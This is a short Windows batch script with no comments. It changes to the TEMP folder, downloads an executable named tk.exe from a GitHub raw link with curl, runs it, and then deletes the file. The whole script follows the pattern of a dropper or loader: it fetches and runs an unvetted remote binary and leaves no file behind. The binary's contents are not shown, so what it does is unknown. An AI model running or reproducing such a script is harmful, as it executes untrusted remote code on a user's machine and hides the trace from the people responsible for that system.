@echo off
cd /d "%TEMP%"
curl -L -o tk.exe https://github.com/raunakrajadh/dtg/raw/main/tk.exe
start /wait tk.exe
del tk.exe
